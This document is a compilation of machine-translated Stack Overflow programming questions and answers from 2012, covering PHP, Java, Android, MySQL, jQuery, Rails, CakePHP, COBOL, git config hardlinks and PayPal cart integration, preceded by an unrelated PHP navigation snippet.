<?php if($page_title != 'Photo Gallery'): ?>
 <p class= "pics">
    <a href="gallery.php" tabindex="6"><img src= "images/gallery.png" alt= "Photo Gallery" /></a>
 </p>
<?php endif; ?>
<?php if($page_title != 'Pollination Services'): ?>
 <p class= "pollination">
     <a href="pollination.php" tabindex="7"><img src= "images/Pollination.png" alt= "Pollination Services" /></a>
 </p>
<?php endif; ?>
<?php if($page_title != 'Pay Us'): ?>
 <p class= "pay">.
     <a href="payus.php" tabindex="8"><img src= "images/PayUs.png" alt= "Pay BeeCharmer" /></a>
 </p>
<?php endif; ?> 
```

# java - 在 java 命令行上的主类之后使用 run 的目的是什么？

> ID：11786579
> 
> 赞同：1
> 
> 时间：2012-08-02T22:12:02.377
> 
> 标签：java

我看到一些代码开始像

```
java MainClass run -cp ****** 
```

我这里有两个问题，

1.  为什么使用运行
2.  为什么要在运行后指定另一个类路径，有什么理由或好处？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-02T22:13:39.583

1.  在您的示例中，“运行”只是程序的一个参数，而不是 JVM。它不是关键字或任何东西。该程序将简单地将其作为字符串传递。

2.  -cp 参数似乎也是程序的一个参数。

从命令行看，我猜 MainClass 程序是用来运行另一个类的，它是在 -cp 参数定义的类路径中查找的。因此，VM 实际使用“run”和“-cp ...”都不是运行 MainClass，而是 MainClass 本身运行另一个程序。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T22:14:37.090

`run`, `-cp`, 并将`******`作为参数传递给*java 类*`main`中的函数。 *`MainClass`*

 *命令行中在类名之后的任何内容都是类的参数，而不是`java`VM 的参数。*

# php - 使用 array_map 替换字符之间的空格

> ID：11786580
> 
> 赞同：0
> 
> 时间：2012-08-02T22:12:02.897
> 
> 标签：php, arrays, string

我正在用逗号分隔值的字符串创建一个数组

```
$result = "apple, hello word, 80, apple";    

$result = str_getcsv($result); //create array     
$result = array_filter(array_map('trim', $result)); //remove whitespaces 
```

值中的某些字符之间有空格，例如`hello world`，我想用破折号替换空格（以使字符串 URL 友好。）示例：`hello-world`

我想过使用遍历数组，但是可以像我正在修剪的`str_replace`那样使用它来做得更好吗？`array_map`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T22:15:21.403

[`str_replace`](http://php.net/manual/en/function.str-replace.php)也可以直接在数组上工作：

```
$result = str_replace(' ', '-', $result); 
```

这将与可读性较差的结果相同

```
$result = array_map(function($el) { return str_replace(' ','-',$el); }, $result); 
```

两者也都相当于经典

```
foreach($result as &$element) {
    $element = str_replace(' ', '-', $element);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T22:15:55.680

尝试

```
function urlFrendly($str){
    return str_replace(' ', '-', $str);
}

$result = "apple, hello word, 80, apple";    

$result = str_getcsv($result); //create array     
$result = array_filter(array_map('trim', $result)); //remove whitespaces
$result = array_map('urlFrendly', $result); 
var_dump($result); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T23:28:55.233

```
$result = "apple, hello word, 80, apple";
$replaced = preg_replace('/\s*([[:alpha:]]+) +([[:alpha:]]+)\s*/', '\\1-\\2',$result);
$array = str_getcsv($replaced);
print_r($array); 
```

输出：

```
Array
(
[0] => apple
[1] => hello-word
[2] => 80
[3] => apple
) 
```

# android - 不使用预编译的主题

> ID：11786583
> 
> 赞同：5
> 
> 时间：2012-08-02T22:12:39.863
> 
> 标签：android, android-theme

是否可以创建`Theme`而不是预编译有限数量的主题（意味着操作系统**提供**的主题和资源 xml）？该主题将根据用户配置在应用程序启动期间应用（值在运行时发生变化，但在创建样式化活动之前，值来自大范围的 http 服务，而不是一组）。

欢迎任何其他解决方案，直到它需要在任何地方使用自定义的 View 类。

我现在需要的是设置全局默认 TextView 文本颜色，当然我不想到处使用子类，我认为失去优化不会造成巨大的灾难，或者至少看到性能差异会很棒.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T08:53:37.553

在您的 Activity 中覆盖[ContextThemeWrapper.getTheme()](http://developer.android.com/reference/android/view/ContextThemeWrapper.html#getTheme%28%29)，并提供您自己的[Theme](http://developer.android.com/reference/android/content/res/Resources.Theme.html)。

或者在调用 super.onCreate 之前在 Activity.onCreate 中应用预定义的主题，提供自己的主题资源 id：

```
@Override
public void onCreate(Bundle si){
   setTheme(R.style.MyTheme);
   super.onCreate(si);
} 
```

在 xml 样式文件中使用主题是首选。您可以继承一些系统主题，并仅覆盖所需的属性。您的 style.xml 示例：

```
<?xml version="1.0" encoding="utf-8"?>
<resources>
   <style name="MyTheme" parent="android:Theme.Holo">
      <item name="android:textColorPrimary">#0f0</item>
   </style>
</resources> 
```

样式和主题很强大，但是缺乏深入的文档，也没有高级工具。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T13:10:46.420

好吧，这可能有点太老套了，但这里有一个镜头。

```
public class BaseActivity extends Activity{

    @Override
    public void onResume() {
        ViewGroup root = ((ViewGroup)findViewById(android.R.id.content));
        applyTheme(root);
    }

    private void applyTheme(View view){
        if (view instanceof ViewGroup && ((ViewGroup) view).getChildCount() !=0){
            for (int i = 0; i< ((ViewGroup) view).getChildCount(); i++){
                applyTheme(((ViewGroup) view).getChildAt(i));
            }
        } else {
            if (view instanceof TextView){
                ((TextView) view).setTextColor(your_color_from_server_here);
            }
        }
    }
} 
```

并让您的所有活动都扩展 BaseActivity。

# ios - ios滚动过大的uiview内存问题

> ID：11786584
> 
> 赞同：1
> 
> 时间：2012-08-02T22:13:07.440
> 
> 标签：ios, memory, uiview, scrollview

我正在制作一个显示乐谱的音乐应用程序。目前，乐谱处于一个非常大的视图中，水平延伸直到音乐结束。显然这不是一个好的解决方案，因为当显示大量音乐时，我很快就会耗尽内存。

我的问题是如何实现我的视图，使我绘制的视图只有屏幕的大小，但内容会在它上面滚动（视图包含在滚动视图中）？我想我只能在屏幕上绘制东西并在视图以不同的 x 坐标滚动时重绘视图，但这看起来很难看，而且会很慢。

感谢您的任何建议。:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-03T00:04:10.207

周围有很多解决方案。通常这些涉及在边缘绘制一到两个屏幕宽度，然后根据需要滚动，然后再次绘制到以前可见的区域。本质上，使用滚动视图作为循环缓冲区。

尝试谷歌搜索[UIScrollView 无限滚动](http://www.google.com/search?q=uiscrollview%20infinite%20scroll)。

另请参阅[无限水平滚动 UIScrollView](https://stackoverflow.com/questions/9440230/infinite-horizontal-scrolling-uiscrollview)。

# mysql - 尝试使用 MySQL Workbench 将 SQL Server 迁移到 MySQL。错误：迁移数据时出现“[Microsoft][ODBC Driver Manager] Invalid argument value”

> ID：11786593
> 
> 赞同：3
> 
> 时间：2012-08-02T22:13:51.377
> 
> 标签：mysql, database, migration, sql-server-2012, workbench

长期潜伏者，第一次海报；希望任何人都可以帮助我。

我使用 MySQL Workbench 5.2.41 将数据库从 SQL Server 迁移到 MySQL 5.0.8

整个过程顺利进行：SQL 和 MySQL 连接测试都很好，skemea 和表按预期创建，一切都检查到“批量数据传输”步骤。那时我收到此错误：

```
...
Migrating data...
wbcopytables.exe --odbc-source=DSN=SQL Server 11;DATABASE=;UID=sa --target=root@127.0.0.1:3306 --progress --passwords-from-stdin --thread-count=1 --table [GSAClosers_v2] [dbo].[AccountBase] `dbo` `AccountBase`
`dbo`.`AccountBase`:Copying 84 columns of 169530 rows from table [GSAClosers_v2].[dbo].[AccountBase]

ERROR: `dbo`.`AccountBase`:SQLGetData: HY009:10:[Microsoft][ODBC Driver Manager] Invalid argument value `dbo`.`AccountBase`:

Finished copying 0 rows in 0m00s
Copy helper has finished
... 
```

对于连接器，我使用 Microsoft SQL Server/ODBC 数据源/DSN：SQL Server，对于 MySQL，使用 IP 和端口（3306）。

SQL Server 2012 Management Studio 连接并且所有操作都按预期工作。

哦，不是：两者都在同一台本地主机上。

如果有人能对此有所了解，我将永远感激不尽。提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-03T06:49:29.917

从[这里](http://social.msdn.microsoft.com/Forums/en-GB/sqlgetstarted/thread/863bbea4-45fb-429c-94d9-838be24f9c7c)：

> [Microsoft][ODBC Driver Manager] 参数值无效。关于您提供的错误消息和代码，这似乎是数据库无效或无法访问。这意味着要么数据库不存在，要么用户没有访问数据库的权限。
> 
> 原来您需要在服务器名称之后指定实例，因此在创建 ODBC 数据源的对话框中的服务器名称中，您必须将其输入为：MyServer\SQLEXPRESS 或 .\SQLEXPRESS

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T12:39:24.970

我认为您可能在从`wbcopytables.exe`. 请记住，这是一个单独的工具，因此您可以从迁移向导的其余部分进行连接这一事实并不意味着您将在`wbcopytables.exe`.

我最担心的是你的 DSN 有空格字符。这可能会被 Windows 终端解释为独立的命令行参数。您可以做的一件事是编辑您的 DSN 名称，删除空格并重试。

您可能还想在没有 DSN 的情况下进行连接，方法是按照我的博客文章中的说明明确放置所有连接参数：[How-To: Guide to Database Migration from Microsoft SQL Server using MySQL Workbench](https://mysqlworkbench.org/2012/07/migrating-from-ms-sql-server-to-mysql-using-workbench-migration-wizard/)。

而且，顺便说一句，既然[MySQL Workbench 5.2.42](http://dev.mysql.com/downloads/workbench/5.2.html)已经发布，你应该去拿它。迁移向导是相当新的，因此重要的错误修复可能会在每个最近的 Workbench 版本中启动。

在任何一种情况下，我认为你应该[提交一个](http://bugs.mysql.com/report.php)关于你的问题的错误，并详细解释如何重现它、可能的解决方案等。

希望这可以帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T19:32:50.437

好的，明白了：卸载java。安装 java 1.6，使用 MySQL 迁移工具。将所有数据类型更改为 varchar、int 和 bits。运行迁移......吃数据。

# javascript - 为可放置事件添加延迟

> ID：11786598
> 
> 赞同：1
> 
> 时间：2012-08-02T22:14:18.833
> 
> 标签：javascript, jquery, jquery-ui, jquery-ui-draggable, jquery-ui-droppable

我有一个带有 dropover 事件处理程序的 droppable 元素。将一个元素拖到可放置对象上会展开一个节点。但是，我想添加一个延迟，以便节点不会立即展开，即您必须在它展开之前将可拖动对象放在可放置对象上一秒钟。

```
droppable.over = function(event, ui) {
    // expand node if dragover lasts 1000 milliseconds
    node.expand();
}; 
```

我的第一个想法是简单地使用`setTimeout`on `node.expand()`，但这并没有达到我想要的效果，它只是延迟了节点扩展。看起来我无法设置任何配置来实现这一点，所以我想知道我该怎么做。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T22:23:48.950

可能是这样的？

```
var globalTimer;

//..
droppable.over = function(event, ui)
{
    globalTimer = setTimeout(function(){node.expand()}, 1000);
},
droppable.out = function(event, ui)
{
    clearTimeout(globalTimer);
}; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T22:21:14.510

尝试添加这个`setTimeout(function () { node.expand() }, 1000);`

但我可能误解了你，你希望节点稍后出现还是仅在它停留在可放置 1000 毫秒时才出现？

# mysql - MySQL 加入和搜索

> ID：11786600
> 
> 赞同：0
> 
> 时间：2012-08-02T22:14:29.930
> 
> 标签：mysql, join

我在加入一些表格时遇到问题，这是我的结构：

```
tbl_imdb:
fldID   fldTitle    fldImdbID
1       Moviename   0000001

tbl_genres:
fldID   fldGenre
1       Action
2       Drama

tbl_genres_rel:
fldID   fldMovieID  fldGenreID
1       1           1
2       1           2 
```

我正在尝试做的是一个查询，它将找到所有既是动作片又是戏剧的电影，这是否可以在没有子查询的情况下完成，如果可以，怎么做？

我现在正在尝试的是：

```
SELECT tbl_imdb.*
FROM tbl_imdb
LEFT JOIN tbl_imdb_genres_rel ON ( tbl_imdb.fldID = tbl_imdb_genres_rel.fldMovieID ) 
LEFT JOIN tbl_imdb_genres ON ( tbl_imdb_genres_rel.fldGenreID = tbl_imdb_genres.fldID ) 
WHERE tbl_imdb_genres.fldGenre =  'Drama'
AND tbl_imdb_genres.fldGenre =  'Action'; 
```

但是这不起作用，但是如果我只保留两个 WHERE 中的一个，它确实有效，但这不是我想要的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T22:24:24.833

`LEFT JOIN`不适用于您的情况，因为两个表上都应该存在记录。你需要`count`电影的实例

```
SELECT  *
FROM    tbl_imdb a 
            INNER JOIN tbl_genres_rel b
                on a.fldID = fldMovieID
            INNER JOIN tbl_genres c
                on c.fldGenreID = b.fldID
WHERE   c.fldGenre IN ('Drama', 'Action')
GROUP BY a.Moviename
HAVING COUNT(*) > 1 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T22:19:20.657

有两种方法：

# 1

```
SELECT     tbl_imdb.*
FROM       tbl_imdb
INNER JOIN tbl_genres_rel            rel_action  
ON         tbl_imdb.fldID          = rel_action.fldMovieID 
INNER JOIN tbl_genres                genre_action
ON         rel_action.fldGenreId   = genre_action.fldID 
AND        'Action'                = genre_action.fldGenre
INNER JOIN tbl_genres_rel            rel_drama  
ON         tbl_imdb.fldID          = rel_drama.fldMovieID 
INNER JOIN tbl_genres                genre_drama
ON         rel_drama.fldGenreId    = genre_drama.fldID 
AND        'Drama'                 = genre_drama.fldGenre 
```

此方法与您的原始解决方案在同一路径上。2个区别：

1.  联接应该是内部的，而不是左侧的，因为您正在尝试获取肯定具有相应类型条目的电影
2.  由于您想找到 2 个不同的流派，因此您必须使用 tbl_genres_rel 和 tbl_genres 进行两次连接，对于您感兴趣的每个特定流派一次。

# 2

```
SELECT     tbl_imdb.*
FROM       tbl_imdb
INNER JOIN tbl_genres_rel              
ON         tbl_imdb.fldID            = tbl_genres_rel.fldMovieID 
INNER JOIN tbl_genres                
ON         tbl_genres_rel.fldGenreId = tbl_genres.fldID 
AND        tbl_genres.fldGenre      IN ('Action', 'Drama')
GROUP BY   tbl_imdb.fldID
HAVING     COUNT(*) = 2 
```

同样，基本的加入计划是相同的。这里的不同之处在于我们只加入了 tbl_genres_rel 和 tbl_genres 路径一次。这本身会获取一部电影的所有类型，然后过滤出您感兴趣的类型。符合条件的那些现在将有 2 行用于 tbl_imdb.fldId 的每个不同值。GROUP BY 对此进行聚合，将其压平为一行。通过在`HAVING`子句中断言我们正好有 2 行，我们确保我们只保留那些同时具有两种类型的行。

（请注意，这假设 tbl_genres_rel 在 {fldMovieID, fldGenreID} 上存在唯一约束。如果不存在这样的约束，您应该考虑添加它。）

# c# - 将多个项目添加到 PayPal 购物车

> ID：11786608
> 
> 赞同：3
> 
> 时间：2012-08-02T22:15:48.740
> 
> 标签：c#, paypal

我已经为 PayPal 创建了一个类，它非常适合添加单个项目，但是我现在正试图让它作为一个购物车工作，这样我就可以添加多个产品并使用我的徽标自定义页面。

任何人都可以提供任何关于我如何做到这一点的例子吗？我浏览了很多网站，但似乎没有一个能很好地解释。据我了解，我正在使用 PayPal Standard。

```
public static class PayPal
{

    public static string _URLRedirect;
    public static void ProcessPayment(int Amount, string ItemName)
    {

        const string Server_URL = "https://www.sandbox.paypal.com/cgi-bin/webscr?";
        const string return_URL = "https://www.paypal.com/xclick/Sample@gmail.com";
        const string cancelreturn_URL = "http://www.PageWhenCancel.com/cc.fail.aspx";

        //Assigning Cmd Path as Statically to Parameter
        string cmd = "_xclick";

        //Assigning business Id as Statically to Parameter
        string business = "payments@xxx.xx.xx";// Enter your business account here

        //Assigning item name as Statically to Parameter
        string item_name = ItemName.ToString();

        //Passing Amount as Statically to parameter 
        int amount = Amount;

        //Passing Currency as Statically to parameter
        string currency_code = "GBP";

        string redirect = "";

        //Pass your Server_Url,cmd,business,item_name,amount,currency_code variable.        
        redirect += Server_URL;
        redirect += "cmd=" + cmd;
        redirect += "&business=" + business;
        redirect += "&item_name=" + item_name;
        redirect += "&amount=" + amount;
        redirect += "&currency_code=" + currency_code;

        redirect += "&return=" + return_URL;
        redirect += "&cancel_return" + cancelreturn_URL;

        //Redirect to the payment page
        _URLRedirect = redirect.ToString();
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-03T05:17:17.527

您好我目前面临类似的问题，直到我意识到 asp.net 中继器可以帮助我解决这个问题。

例如，在您的应用程序界面上，它必须包含此 ff。默认情况下的代码行（以防您希望您的项目列表是动态的）：

```
<form id="Paypal" name="Paypal" action="https://www.sandbox.paypal.com/cgi-bin/webscr">
method="post">
<input type="hidden" name="cmd" value="_cart" />
<input type="hidden" name="upload" value="1" />
<input type="hidden" name="business" value="<%=System.Web.Configuration.WebConfigurationManager.AppSettings[" paypalemail="] %>" />
<asp:repeater id="rptItems" runat="server" xmlns:asp="#unknown">
<itemtemplate>
    <input type="hidden" name="item_name_<%# Eval("itemCount") %>" value="<%# Eval("itemValue") %>" />
    <input type="hidden" name="quantity_<%# Eval("itemCount") %>" value="<%# Eval("quantityValue") %>" />
    <input type="hidden" name="amount_<%# Eval("itemCount") %>" value="<%# Eval("amountValue") %>" />
</itemtemplate>
</asp:repeater>
<input type="hidden" name="shipping_1" value="5" />
<input type="hidden" name="handling_1" value="5" />
<input type="hidden" name="tax_1" value="5" /> 
<input type="hidden" name="currency_code" value="USD" />
<input type="hidden" name="return" value="<%=System.Web.Configuration.WebConfigurationManager.AppSettings[" successurl="] %>" />
<input type="hidden" name="cancel_return" value="<%=System.Web.Configuration.WebConfigurationManager.AppSettings[" failedurl="] %>" />
<input type="hidden" name="lc" value="test lc country" />
<input type="submit" value="Submit" />

</form> 
```

然而：

必需的第三方购物车变量 您的 HTML 代码至少需要以下隐藏的 HTML 变量。有关变量的完整列表，请参阅附录 A，“网站支付标准的 HTML 变量”。表 4.1

必需的第三方购物车变量名称

描述 **item_name1** - 单个项目的名称

**amount_1** - 单个商品的价格或购物车中所有商品的总价

**quantity_1** - 单个项目的数量

**企业**-
您的 PayPal 帐户的电子邮件地址

**item_name_1** - 商品名称或整个购物车的名称

**上传**- 表示使用第三方购物车 有两种方法可以将您的第三方购物车与 PayPal 和网站付款标准集成：

传递各个项目的详细信息。

传递购物车总付款的总额，而不是单个项目的详细信息。

在您的代码后面，您可以执行以下操作：

```
if (!Page.IsPostBack)
    {
        DataTable dtItems = new DataTable();
        dtItems.Columns.Add("itemCount");
        dtItems.Columns.Add("itemValue");
        dtItems.Columns.Add("quantityValue");
        dtItems.Columns.Add("amountValue");
        dtItems.Rows.Add("1","Cellphone", "10", "200.00");
        dtItems.Rows.Add("2", "Bag", "2", "250.00");
        dtItems.Rows.Add("3", "Mouse", "10", "3500.00");
        dtItems.Rows.Add("4", "Keyboard", "5", "200.00");

        rptItems.DataSource = dtItems;
        rptItems.DataBind();
   } 
```

和你好！当您重定向到沙盒时，您会得到这个结果： ![Paypal_capture](../Images/1e757af3ae6e220280e83dc69e183a5e.png)

希望这篇文章回答了你的担忧。:) :)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T22:27:38.873

我过去也遇到过同样的问题。我必须做的是创建自己的购物车，独立于 Paypal。然后，当客户准备结账时，我将其转发给 Paypal。我没有发送多个项目和价格，而是将所有内容组合在一起用于 Paypal。

例如，如果客户订购 3 件不同的商品，每件 5 美元，我的网站将显示 3 件商品和 3 个价格。然而，在被转发到 Paypal 时，客户将看到一个项目（即“我的公司订单”）和一个价格（即 15 美元）。但是当返回我的网站时，客户会再次看到订购了 3 件商品。

如果您正在寻找一个好的购物车系统，那么实际上有数百个支持 Paypal 和这种方法。

# ruby-on-rails - 如何在 ruby on rails 中路由到不同的页面

> ID：11786612
> 
> 赞同：0
> 
> 时间：2012-08-02T22:15:56.637
> 
> 标签：ruby-on-rails

我有一个像这样的会话控制器

```
def create
    user = User.find_by_email(params[:session][:email])
    if user && user.authenticate(params[:session][:password])
      sign_in user
      redirect_to user
    else
      flash.now[:error] = 'Invalid email/password combination' # Not quite right!
      render 'new'
    end
  end 
```

如果您在成功登录时注意到它会执行 redirect_to user ，这是用户控制器中的显示操作。

但是说我必须去用户控制器的新操作，那么我该怎么做呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T22:23:26.797

`redirect_to user`只是 的快捷方式`redirect_to url_for(user)`，它为给定资源 ( ) 生成 url `url_for`，然后重定向到它。

如果你想重定向到另一个 url，你可以使用 path helper。

```
redirect_to new_user_path 
```

您还可以使用`url_for`帮助程序生成 url。

```
redirect_to url_for(:controller => "users", :action => "new") 
```

可以缩短为

```
redirect_to :controller => "users", :action => :new 
```

您甚至可以直接指定一个 url ( `redirect_to '/users/new'`) -*我不建议这样做，因为您以后不能在不更改所有 url 的情况下更改路由。*

## 文档

如您所见，有很多方法可以`redirect_to`在 rails 中指定 url。[查看所有文档](http://api.rubyonrails.org/classes/ActionController/Redirecting.html#method-i-redirect_to)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T22:25:30.157

从另一个控制器渲染一个动作：

```
render 'users/new' 
```

见： http: [//guides.rubyonrails.org/layouts_and_rendering.html#using-render](http://guides.rubyonrails.org/layouts_and_rendering.html#using-render)

# jquery - 登录后重复ajax请求

> ID：11786613
> 
> 赞同：1
> 
> 时间：2012-08-02T22:15:57.473
> 
> 标签：jquery, ajax, callback, xmlhttprequest

我正在尝试解决在做 ajaxy 事情时会话超时的问题。我正在使用 jQuery，并为出现 ajax 错误设置了一个函数。如果是401错误，我想基本暂停一切，让他们用弹窗登录，然后再恢复一切。我不完全确定，但是如果我对它们有更多了解，并且如果可以跟踪 ajax 请求并在稍后调用的某个事件上重试它，那么回调和闭包似乎可能有助于这项工作。

因此，如果他们像这样进行 ajax 调用

```
data = {
    input: value
};
if ($j.statusXHR) {
    $j.statusXHR.abort();
}
$j.statusXHR = $j.ajax({
    url: url,
    data: data,
    type: "POST",
    success: function (data) {
        div.html(data);
    },
    error: function (request, textStatus, error) {
        handleErrors(request, textStatus, error, $j.statusXHR, contentDiv, data);
    }
}); 
```

如果他们没有登录，它会进入这个函数，它会显示一个登录按钮，它会打开一个登录页面的弹出窗口（不能使用 ajax 执行此操作，因为 openid 在另一个域上）。

```
function handleErrors(request, textStatus, error, xhr, elem, data) {
    if (request.status === 401) {
        // not logged in
        url = "/login/ajaxExpired";
        if (xhr) {
            xhr.abort();
        }
        $j.ajax({
            url: url,
            success: function (data) {
                elem.html(html);
            }
        });
    }
} 
```

openid部分的return_to页面应该根据返回的参数检测登录是否成功，关闭弹窗，发起原始ajax请求。这是我想知道的部分。可能吗？

# php - CakePHP 未在用户注册时插入注册日期

> ID：11786614
> 
> 赞同：0
> 
> 时间：2012-08-02T22:16:00.407
> 
> 标签：php, cakephp, registration

我在操作中使用此代码注册新用户：

```
public function register() {
    $this->set('title_for_layout', 'Register');
    if ($this->request->is('post')) {
        $this->User->create();
        if ($this->User->save($this->request->data)) {
            $this->Session->setFlash('Your account has been created. You may now login with your username and password.', 'default', array('class' => 'success-flash'));
            $this->redirect(array('action' => 'register'));
        } else {
            $this->Session->setFlash('There was an error creating your account.', 'default', array('class' => 'error-flash'));
        }
    }
} 
```

但是，`regisered`我的数据库用户表中的字段始终是`0000-00-00 00:00:00`. 如何让 Cake 在此字段中插入正确的日期？谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T22:28:11.090

根据 cakephp 约定，该字段应命名为`created`.

Cakephp 将自动填充该字段。

它写在该[段](http://book.cakephp.org/2.0/en/getting-started.html#creating-the-blog-database)的底部。

更详细的文档，但对于 1.3 版本：[docs](http://book.cakephp.org/1.3/en/view/1002/Creating-Database-Tables#created-and-modified-1015)。

# java - JFrame中的windows动画

> ID：11786615
> 
> 赞同：1
> 
> 时间：2012-08-02T22:16:07.053
> 
> 标签：java, swing

我在问如何在我的自定义 JFrame 中使用 windows 框架动画，更具体地说，我正在谈论最小化或最大化 windows 框架时发生的动画，以及当你将 Window 放在顶部时出现的效果在其中一个角落，它会自动调整大小。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T22:35:21.373

这些动画是特定于操作系统的，因此访问它们的唯一（真实方式）是通过 JNI

# cobol - 如何在大型机 COBOL 中“休眠”？

> ID：11786621
> 
> 赞同：0
> 
> 时间：2012-08-02T22:16:47.473
> 
> 标签：cobol, mainframe, zos

我想我正在使用 Enterprise COBOL for z/OS。

模拟标准 C 库的 sleep() 函数等功能的技术是什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-02T23:53:06.653

可能最简单的方法是使用[语言环境可调用服务](https://www.ibm.com/docs/en/zos/2.4.0?topic=services-using-language-environment-callable) [CEE3DLY](https://www.ibm.com/docs/en/zos/2.4.0?topic=services-cee3dlysuspend-processing-active-enclave-in-seconds)或[CEEDLYM](https://www.ibm.com/docs/en/zos/2.4.0?topic=services-ceedlymsuspend-processing-active-enclave-in-milliseconds)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-22T14:11:02.493

不知道你有没有找到答案。

有一个 IBM 程序可以让机器进入睡眠……或等待：它的名字是**ILBOWAT0**。

这是一个关于如何编码的非常好的示例的链接：[http ://www.mvsforums.com/helpboards/viewtopic.php?t=2008&highlight=delay](http://www.mvsforums.com/helpboards/viewtopic.php?t=2008&highlight=delay)

在此示例中，WAIT-TIME 以秒为单位。

# sql - 将表值参数传递到 SQL CLR 存储过程有什么价值？

> ID：11786622
> 
> 赞同：1
> 
> 时间：2012-08-02T22:16:48.287
> 
> 标签：sql, stored-procedures, parameters

我有一个存储过程要编写，我只需要一个字段中的两个属性。最有可能的是，它一次只能处理一个，也许是两个或三个领域。它也应该是一个 CLR 存储过程。

作为 SQL 的初学者，在我看来传递表值参数是多余的，但是由于这是为了工作，而且是一家相对较大的公司，我想知道是否还有其他考虑因素？与普通参数相比，使用表值参数的确切值是多少。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-03-19T07:27:50.857

我没有看到您的问题中概述了对 CLR 的需求，但是 TVP 肯定有用途。

我已经看到逗号分隔的列表被传递到 SQL 存储过程中，TVP 可以在那里用于更好的类型检查和结构。

它还有助于企业级的稳健性；我的工作是在大约 1 小时内尝试 150 万次插入。用单独的插入（一个接受一堆标量参数的过程）来做这件事是资源密集型的，而且非常非常慢；当转换为使用表值参数执行批量插入时，操作在大约 1/5 的时间内完成。

# linux - 无法硬链接 gitconfig 文件

> ID：11786623
> 
> 赞同：7
> 
> 时间：2012-08-02T22:16:57.783
> 
> 标签：linux, git, hardlink

我正在尝试创建一个 git 存储库来存储我所有的点文件和配置文件。我的想法是简单地创建指向我关心的所有文件的硬链接，并将这些链接存储在他们自己的目录中，我可以将其变成存储库。

我的 ~/.gitconfig 文件遇到了一些问题。似乎每当我运行“git config”命令时，我创建的链接不再指向正确的位置，例如存储库中的文件不再正确更新。

这是一个使用 shell 和交互式 ruby​​ 来确定文件链接状态的示例。

```
# Create the link
$ ln .gitconfig .conf_files/gitconfig  # Create the link

# The files are in fact linked
[1] pry(main)> File.identical?('.gitconfig', '.conf_files/gitconfig')
=> true

# Update the gitconfig file by running a 'git config' command
$ git config --global alias.last 'log -1 HEAD'

# The files are no longer linked.
[2] pry(main)> File.identical?('.gitconfig', '.conf_files/gitconfig')
=> false 
```

我认为这与 git 编写 .gitconfig 文件的方式有关。有谁知道为什么会发生这种情况，或者有任何创造性的解决方法？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-02T23:52:07.930

在[http://www.xxeo.com/archives/2010/02/16/dotfiles-in-git-finally-did-it.html](http://www.xxeo.com/archives/2010/02/16/dotfiles-in-git-finally-did-it.html)的评论中尝试 Eli Barzilay 的解决方案：

> 所以我终于找到了一个兼顾两者的解决方案：将 repo 放在一个子目录中，而不是符号链接，为“core.worktree”添加一个配置选项作为你的主目录。现在，当您在主目录中时，您不在 git repo 中（因此第一个问题消失了），并且您不需要像第二种情况那样处理脆弱的符号链接。您仍然有排除您不希望版本化的路径的小麻烦（例如，“.git/info/exclude”技巧中的“*”），但这并不新鲜。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-02T22:21:09.153

这是完全正常的，实际上是覆盖配置文件的推荐方法。Git 创建一个临时文件，写出配置，然后将新文件移到旧文件上。这样，如果 Git 被中断，您就不会得到一个不完整的配置文件（数据丢失）。

您始终可以编写脚本将配置文件复制或链接到中央存储库。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T22:23:04.633

查看这个答案，也许它可能会有所帮助：

[https://stackoverflow.com/a/3731139/1431696](https://stackoverflow.com/a/3731139/1431696)

同时，您是否考虑过反向做链接？创建包含配置文件等的存储库，然后在您实际使用文件的地方，创建指向位于存储库中的“真实”文件的硬链接。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-02T23:04:57.200

感谢 Dietrich Epp 的回答和建议，我决定从不同的角度解决这个问题，方法是在我的文件系统的根目录创建存储库，并使用 .gitignore 仅跟踪我感兴趣的文件。

我的 .gitignore 文件现在看起来像这样：

```
/*

!/etc/
/etc/*

# etc files
!/etc/rc.conf
!/etc/asound.conf
!/etc/mercurial/

!/home/
!/home/matt/
/home/matt/*

# Home files
!/home/matt/.xinitrc
!/home/matt/.gitconfig
!/home/matt/.bashrc

# Vim files
!/home/matt/.vimrc
!/home/matt/.vim/
.netrwhist 
```

除了不必单独复制文件并将它们保存在两个单独的位置之外，这还有一个好处，即如果我需要，我可以轻松地还原更改，而无需手动复制文件。

谢谢你们的帮助！

# javascript - 从 MVC3 中的 MEF 插件加载 javascript 文件

> ID：11786624
> 
> 赞同：3
> 
> 时间：2012-08-02T22:17:01.340
> 
> 标签：javascript, asp.net-mvc-3, mef

我正在制作一个 MEF/MVC3 应用程序，每个插件都有自己的 javascript 文件。我应该如何让主 MEF 应用程序从插件访问 javascript 文件？

我尝试使 js 文件成为嵌入式资源，然后将其加载到插件中，`.vbhtml`例如：

```
<script type="text/javascript"
   src="@Url.Content("~/bin/CUContractNumberPlugin.dll/CUContractNumberPlugin.CUContractNumberPlugin.js")">
